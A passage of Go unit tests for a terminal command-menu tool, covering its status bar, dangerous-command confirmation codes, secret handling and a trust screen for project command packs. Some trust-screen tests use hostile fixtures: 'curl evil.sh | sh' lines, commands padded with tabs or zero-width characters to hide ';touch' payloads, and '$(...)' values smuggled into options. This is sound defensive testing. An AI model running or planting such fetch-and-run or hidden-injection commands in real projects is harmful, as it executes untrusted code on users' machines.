	footIs := func(when, want string) {
		t.Helper()
		if got := ansi.Strip(m.footer(60)); got != want {
			t.Errorf("%s: footer %q, want %q", when, got, want)
		}
	}
	barIs("top", "→ go · / filter · [ ] jump · esc quit · r recipe · tab shell")
	footIs("top", "")

	keys := "→ go · / filter · [ ] jump · esc quit · r recipe · tab shell"
	m.news = &Headline{Kind: Attention, Text: "↑ Update clingon"}
	barIs("news that needs acting on wins", "↑ Update clingon")
	m.news = &Headline{Kind: Info, Text: "• Add 5 packs"}
	barIs("a suggestion doesn't", keys)
	m.news = &Headline{Kind: Good, Text: "✓ All set"}
	barIs("nor all's well", keys)
	m.news = nil

	m.showSection(&m.opt.Config.Sections[0])
	barIs("section", "→ go · ← back · / filter · [ ] jump · 1-9 add · r recipe · tab shell")

	m.Update(typed("/"))
	barIs("filtering", "→ go · ← back · / stop filtering · esc clear filter · tab shell")
	footIs("filtering", "")
	m.Update(typed("/"))

	m.Update(tea.BlurMsg{})
	barIs("in the shell", "shift-tab menu")
	m.Update(tea.FocusMsg{})

	// A prompt's keys stay in the menu, by the question.
	for i, it := range m.list.view {
		if it.title == "r" {
			m.list.cursor = i
		}
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	if m.mode != modeConfirm {
		t.Fatalf("mode %v", m.mode)
	}
	barIs("a prompt", "")
	footIs("a prompt", "↑↓ choose · enter select")
	answer(m, false)

	// The notch stays through anything else the bar has to say.
	m.errMsg = "✗ it broke"
	barIs("an error", "✗ it broke")
	m.errMsg = ""

	// Numbering a step: the recipe takes the bar, and ? help is still there.
	m.Update(typed("1"))
	if bar := ansi.Strip(m.statusBar(120)); !strings.HasPrefix(bar, " ? help ") || !strings.Contains(bar, "recipe") || strings.Contains(bar, "/ filter") {
		t.Errorf("bar %q", bar)
	}
	footIs("with a recipe", "")

	// In print mode there's no shell pane to go to, and no recipes.
	p := New(Options{Config: &config.Config{Sections: sections}})
	p.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	if bar := strings.TrimSpace(ansi.Strip(p.statusBar(120))); bar != "? help  → go · / filter · [ ] jump · esc quit" {
		t.Errorf("print mode: bar %q", bar)
	}
}

func TestWhenGreysOutAwayFromItsFiles(t *testing.T) {
	repo, elsewhere := t.TempDir(), t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(repo, "src", "deep"), 0o755); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join(repo, "src", "deep") // a folder above has .git
	sec := config.Section{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Status", Cmd: "git status", When: []string{".git"}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }, Dir: func() string { return dir }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	if m.list.selected().disabled {
		t.Fatal("a .git above the folder counts")
	}
	dir = elsewhere
	m.Update(tea.FocusMsg{}) // back from the shell, after a cd
	if !m.list.items[1].disabled {
		t.Fatal("away from .git it should be greyed out")
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 0 || m.mode != modeBrowse {
		t.Fatal("a greyed-out command doesn't run")
	}
	dir = filepath.Join(repo, "src", "deep")
	m.Update(tea.FocusMsg{}) // and back in the repo
	if it := m.list.selected(); it == nil || it.title != "Status" {
		t.Fatalf("usable again: the cursor goes back to it, got %+v", it)
	}
}

func TestDangerMeansTypingACode(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Drop", Cmd: "dropdb <db>", Risk: config.RiskDanger, Args: []config.Arg{{Name: "db"}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	typ := func(s string) { m.Update(typed(s)) }
	enter := tea.KeyPressMsg{Code: tea.KeyEnter}
	if !strings.Contains(m.list.render(60, 10), dangerGlyph) {
		t.Error("danger commands are marked ☠")
	}
	m.Update(enter)
	typ("prod")
	m.Update(enter)
	if m.mode != modeConfirm || m.pending.typed {
		t.Fatal("want the type-the-code screen")
	}
	code := m.pending.code
	if len(code) != 4 || !strings.Contains(m.View().Content, code) {
		t.Fatalf("want a 4-letter code on screen, got %q", code)
	}
	m.Update(enter) // nothing typed: refused
	typ("dropdb prod")
	m.Update(enter) // wrong: refused, with a new code
	if !m.wrong || m.pending.typed || len(sent) != 0 || m.word.Value() != "" {
		t.Fatal("a mismatch shouldn't get through, and clears the box")
	}
	for _, near := range []func(string) string{strings.ToUpper, func(c string) string { return " " + c }, func(c string) string { return c + " " }} {
		typ(near(m.pending.code)) // each miss brings a new code, so build from the current one
		m.Update(enter)           // exactly the code: case and spaces count
		if m.pending.typed {
			t.Fatal("only the exact code gets through")
		}
	}
	typ(m.pending.code)
	m.Update(enter)
	if !m.pending.typed || m.yes {
		t.Fatal("typed right: now No/Yes, with No first")
	}
	answer(m, true)
	if len(sent) != 1 || sent[0] != "dropdb prod" {
		t.Fatalf("got %v", sent)
	}
}

func TestPatternRefusesBadValues(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Kill", Cmd: "kill-port <port>", Args: []config.Arg{{Name: "port", Pattern: "[0-9]+", Placeholder: "3000"}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(typed("80a"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 0 || !strings.Contains(m.job.invalid, "For example: 3000") {
		t.Fatalf("80a isn't a port: sent %v, said %q", sent, m.job.invalid)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyBackspace})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 || sent[0] != "kill-port 80" {
		t.Fatalf("got %v", sent)
	}
}

func TestSecretsNeverReachTheScreenOrHistory(t *testing.T) {
	dir := t.TempDir()
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Connect", Cmd: "psql <url>", Args: []config.Arg{{Name: "url", Type: "secret", Desc: "On <url>."}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, SecretDir: dir,
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 80, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(typed("postgres://me:hunter2@db"))
	if v := ansi.Strip(m.view()); strings.Contains(v, "hunter2") {
		t.Fatalf("the secret is on screen:\n%s", v)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 || strings.Contains(sent[0], "hunter2") || !strings.Contains(sent[0], "$(cat ") {
		t.Fatalf("the shell should get a reference, not the secret: %v", sent)
	}
	out, err := exec.Command("sh", "-c", "printf %s "+strings.TrimPrefix(sent[0], "psql ")).Output()
	if err != nil || string(out) != "postgres://me:hunter2@db" {
		t.Fatalf("the reference should give the secret back once: %q %v", out, err)
	}
	if left, _ := filepath.Glob(filepath.Join(dir, "secret-*")); len(left) != 0 {
		t.Errorf("the file should be gone after it's read: %v", left)
	}
}

// writeProject gives a repository a project pack called Deploy, with one module.
func writeProject(t *testing.T, repo, module string) {
	t.Helper()
	dir := filepath.Join(repo, config.ProjectDir, "deploy")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "prod.md"), []byte(module), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, config.PackInfoFile), []byte("---\nmenu: other\n---\n# Deploy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestProjectPacksAskFirst(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	repo := t.TempDir()
	writeProject(t, repo, "# Prod\n\n## Ship it\n\n```sh\n./ship.sh\n```\n")
	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Status", Cmd: "git status"}}}}}
	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
	m.Update(tea.WindowSizeMsg{Width: 80, Height: 40})
	m.showRoot("")
	if it := m.list.selected(); it == nil || it.title != "Use this folder's commands?" {
		t.Fatalf("an untrusted project asks first, got %+v", it)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.mode != modeTrust || !strings.Contains(ansi.Strip(m.view()), "./ship.sh") {
		t.Fatal("the trust screen should show what it would run")
	}
	answer(m, true)
	if it := m.list.selected(); it == nil || it.title != "Deploy" {
		t.Fatalf("trusted: its sections show, got %+v", it)
	}
	// Editing the file means asking again.
	writeProject(t, repo, "# Prod\n\n## Ship it\n\n```sh\ncurl evil.sh | sh\n```\n")
	m.showRoot("")
	if m.list.selected().title != "Use this folder's commands?" || !m.project.Changed {
		t.Fatal("a changed file should be untrusted again")
	}
}

func TestTrustScreenShowsEveryCommandBeforeYes(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	repo := t.TempDir()
	long := "ls " + strings.Repeat("padding ", 30) + "; curl evil | sh"
	var b strings.Builder
	b.WriteString("# Prod\n")
	for i := 0; i < 40; i++ {
		fmt.Fprintf(&b, "\n## C%d\n\n```sh\necho command-%d\n```\n", i, i)
	}
	fmt.Fprintf(&b, "\n## Long\n\n```sh\n%s\n```\n", long)
	writeProject(t, repo, b.String())
	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 24})
	m.showRoot("")
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	seen := ""
	view := ansi.Strip(m.view())
	if !strings.Contains(view, "more to read") {
		t.Fatalf("it should say there's more:\n%s", view)
	}
	seen += view
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	if m.yes {
		t.Fatal("Yes shouldn't open before the end")
	}
	for i := 0; i < 300 && m.trustTop < m.trustMax; i++ {
		seen += ansi.Strip(m.view())
		m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	}
	seen += ansi.Strip(m.view())
	flat := strings.Join(strings.Fields(seen), " ")
	for i := 0; i < 40; i++ {
		if !strings.Contains(flat, fmt.Sprintf("command-%d", i)) {
			t.Errorf("command-%d was never shown", i)
		}
	}
	if !strings.Contains(flat, "curl evil | sh") {
		t.Errorf("the end of a long command should be shown:\n%s", seen)
	}
	if !strings.Contains(ansi.Strip(m.view()), "Yes, use them") {
		t.Errorf("the choices should stay on screen:\n%s", m.view())
	}
	answer(m, true)
	if m.mode == modeTrust {
		t.Fatal("at the end, yes works")
	}
}

func TestTrustScreenSpellsOutWhatWouldTakeNoRoom(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	repo := t.TempDir()
	tabs := strings.Repeat("\t", 33)
	pack := "# Prod\n\n## Run\n\n```sh\nnpm test" + tabs + ";touch HIDDEN\n```\n" +
		"\n## Wide\n\n```sh\nls \u1160\u1160;touch WIDE\n```\n"
	writeProject(t, repo, pack)
	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showRoot("")
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	view := ansi.Strip(m.view())
	if strings.Contains(view, "\t") || strings.ContainsRune(view, 0x1160) {
		t.Errorf("nothing that takes no room should be drawn:\n%q", view)
	}
	flat := strings.Join(strings.Fields(view), "")
	for _, want := range []string{`\t\t`, "HIDDEN", `\u{1160}`, "WIDE"} {
		if !strings.Contains(flat, want) {
			t.Errorf("%s should be on screen:\n%s", want, view)
		}
	}
}

func TestTrustScreenShowsOptionsAndDefaults(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	repo := t.TempDir()
	pack := "# Prod\n\n## D\n\n```sh\necho <env>\n```\n\n- `<env>` Env\n  - ( ) `staging;touch OPT` staging\n" +
		"\n## H\n\n```sh\necho <who>\n```\n\n- `<who>` Who\n  - (x) `$(touch DEF)`\n" +
		"\n## J\n\n```sh\necho <x>\n```\n\n- `<x>` X\n  - [ ] `a;touch FLAG`\n  - [ ] `b`\n"
	writeProject(t, repo, pack)
	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 48})
	m.showRoot("")
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	view := ansi.Strip(m.view())
	for _, want := range []string{"touch OPT", "touch DEF", "touch FLAG"} {
		if !strings.Contains(view, want) {
			t.Errorf("%s should be on the trust screen:\n%s", want, view)
		}
	}
}

func TestQuestionMarkShowsTheKeys(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "A", Cmd: "a"}}}}}})
	m.Update(tea.WindowSizeMsg{Width: 80, Height: 40})
	m.showRoot("")
	m.Update(typed("?"))
	if !m.help || !strings.Contains(ansi.Strip(m.view()), "shift-tab") {
		t.Fatal("? should show the keys")
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	if m.help || m.list.query() != "" {
		t.Fatal("any key closes it, and does nothing else")
	}
}

func TestAnEmptiedDefaultStaysEmpty(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Log", Cmd: "log <n> <x>", Args: []config.Arg{{Name: "n", Default: "20", Optional: true}, {Name: "x"}}},
	}}
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, Send: func(string) error { return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.KeyPressMsg{Code: tea.KeyBackspace})
	m.Update(tea.KeyPressMsg{Code: tea.KeyBackspace})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter}) // n cleared on purpose
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})  // back to it
	if v := m.job.input.Value(); v != "" {
		t.Fatalf("the default shouldn't come back after being cleared, got %q", v)
	}
}

func TestTextHelpersHandleWideAndAccentedText(t *testing.T) {
	if got := sentence("école fermée"); got != "École fermée." {
		t.Errorf("sentence = %q", got)
	}
	if got := ansi.Strip(block("zzzzzzzzz 日本 ab cd", 10, 1, true)); strings.Contains(got, "…b") {
		t.Errorf("the cut should fall between words, got %q", got)
	}
	p := newPicker([]item{{title: "A", header: true}, {title: "a1"}, {title: "G", header: true}, {title: "g1"}}, nil, false)
	p.cursor = 3
	if got := ansi.Strip(p.render(20, 1)); !strings.Contains(got, "g1") {
		t.Errorf("one row of room: it should show the cursor's row, got %q", got)
	}
}

func TestScrolledGroupKeepsItsHeading(t *testing.T) {
	var items []item
	for _, g := range []string{"Alpha", "Beta"} {
		items = append(items, item{title: g, header: true})
		for i := range 8 {
			items = append(items, item{title: fmt.Sprintf("%s %d", g, i)})
		}
	}
	p := newPicker(items, nil, false)
	for range 6 {
		p.move(1)
	}
	got := strings.Split(ansi.Strip(p.render(40, 4)), "\n")
	if len(got) != 4 || got[0] != "ALPHA" || !strings.Contains(got[2], "Alpha 6") || !strings.Contains(got[3], "more") {
		t.Fatalf("the heading should be pinned on top, the cursor's row under it, then what's left, got %q", got)
	}
	for range 6 { // well into Beta: its heading takes over
		p.move(1)
	}
	got = strings.Split(ansi.Strip(p.render(40, 4)), "\n")
	if len(got) != 4 || got[0] != "BETA" || !strings.Contains(got[2], "Beta 4") || !strings.Contains(got[3], "more") || strings.Contains(got[1], "Beta 0") {
		t.Fatalf("the next group's heading is pinned instead, got %q", got)
	}
	p.cursor, p.offset = 0, 0
	if got := ansi.Strip(p.render(40, 4)); strings.Count(got, "ALPHA") != 1 {
		t.Fatalf("at the top it's not doubled, got %q", got)
	}
}

func TestQuittingAsksFirst(t *testing.T) {
	jobs := []string{"sleep"}
	send := func(string) error { return nil }
	m := New(Options{Config: &config.Config{}, Send: send, Jobs: func() []string { return jobs }})
	esc, enter := tea.KeyPressMsg{Code: tea.KeyEscape}, tea.KeyPressMsg{Code: tea.KeyEnter}
	m.Update(esc)
	if m.mode != modeQuit || m.Quit {
		t.Fatalf("it should ask, got mode %v quit %v", m.mode, m.Quit)
	}
	if got := ansi.Strip(m.quitView(60)); !strings.Contains(got, "sleep") {
		t.Errorf("it should say what would end: %q", got)
	}
	m.Update(esc)
	if m.mode != modeBrowse || m.Quit {
		t.Fatal("a second esc goes back: a double-tap never quits")
	}
	m.Update(esc)
	m.Update(enter)
	if m.mode != modeBrowse || m.Quit {
		t.Fatal("no comes first, so enter stays")
	}
	m.Update(esc)
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	if _, cmd := m.Update(enter); !m.Quit || cmd == nil {
		t.Fatal("yes quits")
	}

	// With nothing running it still asks, and goes back to asking plainly.
	jobs = nil
	m = New(Options{Config: &config.Config{}, Send: send, Jobs: func() []string { return jobs }})
	if m.Update(esc); m.mode != modeQuit || m.Quit {
		t.Fatalf("it should ask, got mode %v quit %v", m.mode, m.Quit)
	}
	if got := ansi.Strip(m.quitView(60)); !strings.Contains(got, "Quit clingon?") || strings.Contains(got, "Still running") {
		t.Errorf("view %q", got)
	}
	m.Update(esc)
	if m.mode != modeBrowse || m.Quit {
		t.Fatal("a second esc goes back: a double-tap never quits")
	}

	// Print mode has no shell to close, so there's nothing to ask.
	p := New(Options{Config: &config.Config{}})
	if p.Update(esc); !p.Quit {
		t.Fatal("in print mode, esc quits straight away")
	}
}

// A resize repaints from clean: without it, one as the window opens left rows
// drawn over each other once the list scrolled.
func TestResizeRepaintsFromClean(t *testing.T) {
	m := New(Options{Config: &config.Config{}})
	_, cmd := m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	if cmd == nil {
		t.Fatal("a resize asked for no repaint")
	}
	if got, want := fmt.Sprintf("%T", cmd()), fmt.Sprintf("%T", tea.ClearScreen()); got != want {
		t.Errorf("a resize sent %s, want %s", got, want)
	}
}

// A shell still reading its rc file locks the menu but doesn't say so: its
// subprocesses come and go too fast to read.
func TestStartingShellLocksQuietly(t *testing.T) {
	st := ShellState{Busy: "brew", Starting: true}
	m := New(Options{Config: &config.Config{}, Shell: func() ShellState { return st }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.readShell()
	if m.blocked() == "" {
		t.Error("the menu should still hold commands back")
	}
	if bar := ansi.Strip(m.barBody(60)); strings.Contains(bar, "is running") {
		t.Errorf("the band should wait for the first prompt, got %q", bar)
	}
	st = ShellState{}
	m.readShell()
	st = ShellState{Busy: "sleep"}
	m.readShell()
	if bar := ansi.Strip(m.barBody(60)); !strings.Contains(bar, "sleep is running") {
		t.Errorf("after the first prompt the band should say so, got %q", bar)
	}
}

// Leaving for the shell and coming back, by focus event or by key, works on
// every screen: refocusing an input that screen never made used to panic,
// which took the whole session and its window with it.
func TestLeavingAndComingBackOnEveryScreen(t *testing.T) {
	text := []config.Arg{{Name: "name", Prompt: "name", Desc: "d"}}
	picks := []config.Arg{{Name: "name", Desc: "d", Options: []config.Option{{Value: "a"}, {Value: "b"}}}}
	for _, c := range []struct {
		name string
		cmd  config.Command
		keys []tea.KeyPressMsg
		mode mode
	}{
		{"typing", config.Command{Name: "C", Cmd: "x <name>", Args: text}, nil, modeFill},
		{"picking", config.Command{Name: "C", Cmd: "x <name>", Args: picks}, nil, modeFill},
		{"y/N", config.Command{Name: "C", Cmd: "x", Risk: config.RiskWarn}, nil, modeConfirm},
		{"y/N after typing", config.Command{Name: "C", Cmd: "x <name>", Args: text, Risk: config.RiskWarn}, []tea.KeyPressMsg{typed("v"), {Code: tea.KeyEnter}}, modeConfirm},
		{"danger code", config.Command{Name: "C", Cmd: "x", Risk: config.RiskDanger}, nil, modeConfirm},
	} {
		for _, back := range []struct {
			name string
			msg  tea.Msg
		}{{"focus", tea.FocusMsg{}}, {"key", typed("z")}} {
			t.Run(c.name+"/"+back.name, func(t *testing.T) {
				sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{c.cmd}}
				m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
					Send: func(string) error { return nil }})
				m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
				m.showSection(&m.opt.Config.Sections[0])
				m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
				for _, k := range c.keys {
					m.Update(k)
				}
				if m.mode != c.mode {
					t.Fatalf("mode %d, want %d", m.mode, c.mode)
				}
				m.Update(tea.BlurMsg{})
				_ = m.View()
				m.Update(back.msg)
				_ = m.View()
				if m.mode != c.mode || m.Quit {
					t.Errorf("coming back moved on: mode %d, quit %v", m.mode, m.Quit)
				}
				for _, in := range m.shownInputs() {
					if !in.Focused() {
						t.Error("an input on screen is still blurred")
					}
				}
			})
		}
	}
}

func TestSavingARecipe(t *testing.T) {
	cmds := []config.Command{{Name: "one", Cmd: "one"}, {Name: "two", ID: "s-22222222", Cmd: "two"}}
	var sent []string
	var saved []config.Recipe
	failed, known := false, true
	m := New(Options{
		Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: cmds}}},
		Send:   func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true },
		LastFailed: func() (bool, bool) { return failed, known }, Shell: func() ShellState { return ShellState{} },
		Recipes: func() []config.Recipe { return saved }, Self: "clingon",
		Builtin: func() []*config.Section {
			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
		}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	sec := &m.opt.Config.Sections[0]
	oneID := sec.CommandID(&sec.Commands[0])
	saveCmd := "clingon recipe add 'My flow' " + oneID + " s-22222222"
	on := func(name string) {
		t.Helper()
		for i, it := range m.list.view {
			if it.title == name {
				m.list.cursor = i
				return
			}
		}
		t.Fatalf("no row %q", name)
	}
	right := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyRight}) }
	left := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyLeft}) }
	down := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyDown}) }
	done := func() { t.Helper(); m.Update(idleMsg{seq: m.run.seq, ok: true}) }
	sentIs := func(want string) {
		t.Helper()
		if got := strings.Join(sent, " | "); got != want {
			t.Errorf("sent %q, want %q", got, want)
		}
	}
	number := func() {
		t.Helper()
		m.showSection(sec)
		on("one")
		m.Update(typed("1"))
		on("two")
		m.Update(typed("2"))
		sent, m.errMsg, m.hint = nil, "", ""
		m.Update(typed("r"))
	}
	number()

	// Run recipe asks, and No is first: it just runs.
	right()
	if m.mode != modeSave || len(sent) != 0 || !strings.Contains(m.view(), "Add this recipe first?") {
		t.Fatalf("should ask first: mode %v, sent %v", m.mode, sent)
	}
	right()
	sentIs("one")
	done()
	done()
	sentIs("one | two")
	if m.run != nil || len(saved) != 0 {
		t.Fatalf("run %+v, saved %v", m.run, saved)
	}

	// Yes asks for a name, and ← steps back through the questions, sending nothing.
	sent = nil
	right()
	down()
	right()
	if m.mode != modeSaveName || !strings.Contains(m.view(), "Name this recipe") {
		t.Fatalf("mode %v: should ask for a name", m.mode)
	}
	right() // no name yet
	if m.mode != modeSaveName || m.run != nil {
		t.Fatal("a name is needed")
	}
	left()
	if m.mode != modeSave || !m.yes {
		t.Fatalf("← from the name: mode %v, yes %v", m.mode, m.yes)
	}
	left()
	if m.mode != modeBrowse || m.run != nil || len(sent) != 0 || len(m.recipe) != 2 {
		t.Fatalf("← from the question: mode %v, run %+v, sent %v", m.mode, m.run, sent)
	}

	// A name that's taken is refused there and then.
	saved = []config.Recipe{{Name: "My Flow", Steps: []string{"x-00000000"}}}
	right()
	answer(m, true)
	m.Update(typed("my flow"))
	right()
	if m.mode != modeSaveName || !strings.Contains(m.view(), "already have") {
		t.Fatalf("mode %v: a taken name should be refused", m.mode)
	}
	saved = nil

	// The save is a command in the shell, by ID, and the steps follow it.
	m.word.SetValue("")
	m.Update(typed("My  flow"))
	if !strings.Contains(ansi.Strip(m.infoPane(60)), "clingon recipe add") {
		t.Errorf("the command should show as it's named:\n%s", m.infoPane(60))
	}
	right()
	sentIs(saveCmd)
	saved = []config.Recipe{{Name: "My flow", Steps: []string{oneID, "s-22222222"}}}
	done()
	sentIs(saveCmd + " | one")
	done()
	done()
	sentIs(saveCmd + " | one | two")
	if m.run != nil || len(m.recipe) != 2 {
		t.Fatalf("run %+v, recipe %d steps", m.run, len(m.recipe))
	}

	// Now it's saved there's nothing to ask, and it's listed.
	sent = nil
	on("Run recipe")
	right()
	if m.mode == modeSave {
		t.Error("the same steps are saved already: shouldn't ask")
	}
	sentIs("one")
	done()
	done()
	if !strings.Contains(m.view(), "SAVED RECIPES") {
		t.Errorf("should list it:\n%s", m.view())
	}

	// One list of them: the same recipe isn't repeated under other headings.
	if view := m.view(); !strings.Contains(view, "SAVED RECIPES") || strings.Count(ansi.Strip(view), "My flow") != 1 {
		t.Errorf("should list it once:\n%s", view)
	}

	// Its row opens its own list, in this order. ← goes back to its row.
	titles := func() string {
		var ts []string
		for i, it := range m.list.view {
			if m.list.selectable(i) {
				ts = append(ts, it.title)
			}
		}
		return strings.Join(ts, " ")
	}
	open := func(name string) {
		t.Helper()
		on(name)
		right()
		if titles() != "Run Describe Remove" {
			t.Fatalf("%s's rows: %q", name, titles())
		}
	}
	m.Update(typed("x"))
	sent, m.hint = nil, ""
	open("My flow")
	if !strings.Contains(ansi.Strip(m.view()), "› My flow") || m.list.selected().title != "Run" {
		t.Errorf("at %+v:\n%s", m.list.selected(), m.view())
	}
	left()
	if it := m.list.selected(); m.section != m.recipesSection() || it == nil || it.title != "My flow" {
		t.Fatalf("← should go back to its row, at %+v", it)
	}

	// Run makes it the current recipe, in place of what's numbered, and runs it.
	open("My flow")
	on("Run")
	right()
	sentIs("one")
	if len(m.recipe) != 2 || m.run == nil || m.opened != "" {
		t.Fatalf("recipe %d steps, run %+v, opened %q", len(m.recipe), m.run, m.opened)
	}
	done()
	done()

	// Inspect sends that alone, runs no steps, and stays on the row.
	open("My flow")
	on("Describe")
	inspecting := m.list.cursor
	sent = nil
	right()
	sentIs("clingon recipe describe 'My flow'")
	if m.run != nil || m.list.cursor != inspecting || m.opened != "My flow" {
		t.Errorf("run %+v, cursor %d, want %d, opened %q", m.run, m.list.cursor, inspecting, m.opened)
	}

	// Delete asks first, No first, and sends nothing unless it's Yes.
	idle := func() { t.Helper(); m.Update(idleMsg{seq: m.runSeq, ok: true}) }
	idle()
	saved = []config.Recipe{{Name: "A", Steps: saved[0].Steps}, {Name: "My flow", Steps: saved[0].Steps}, {Name: "Z", Steps: saved[0].Steps}}
	m.showSection(m.section)
	on("Remove")
	if it := m.list.selected(); it.risk != config.RiskWarn {
		t.Errorf("should be marked as a warning: %+v", it)
	}
	sent = nil
	right()
	if m.mode != modeConfirm || m.yes || len(sent) != 0 {
		t.Fatalf("should ask, No first: mode %v, yes %v, sent %v", m.mode, m.yes, sent)
	}
	right()
	if it := m.list.selected(); len(sent) != 0 || m.mode != modeBrowse || it.title != "Remove" {
		t.Errorf("No: sent %v, mode %v, at %+v", sent, m.mode, it)
	}
	right()
	answer(m, true)
	sentIs("clingon recipe remove 'My flow'")

	// If it fails it's still there, and so are you.
	idle()
	if it := m.list.selected(); m.opened != "My flow" || it.title != "Remove" {
		t.Errorf("opened %q, at %+v", m.opened, it)
	}

	// When it's gone, you're back in Saved recipes, on the next one.
	right()
	answer(m, true)
	saved = slices.Delete(saved, 1, 2)
	idle()
	if it := m.list.selected(); m.opened != "" || it.title != "Z" {
		t.Errorf("opened %q, at %+v:\n%s", m.opened, it, m.view())
	}

	// Removed in the shell by hand, the list catches up as well.
	saved = saved[:1]
	idle()
	if strings.Contains(ansi.Strip(m.view()), "Z") {
		t.Errorf("Z was removed by hand:\n%s", m.view())
	}

	// A step whose command has gone stops it before anything runs.
	saved = []config.Recipe{{Name: "Old", Steps: []string{"x-00000000"}}}
	m.showSection(m.section)
	sent = nil
	open("Old")
	on("Run")
	right()
	if len(sent) != 0 || m.run != nil || !strings.Contains(m.errMsg, "gone") {
		t.Errorf("sent %v, run %+v, err %q", sent, m.run, m.errMsg)
	}
	left()

	// A save that fails stops there: no steps run, and the recipe stays.
	saved, failed, sent = nil, true, nil
	m.errMsg = ""
	on("Run recipe")
	right()
	answer(m, true)
	m.Update(typed("Again"))
	right()
	done()
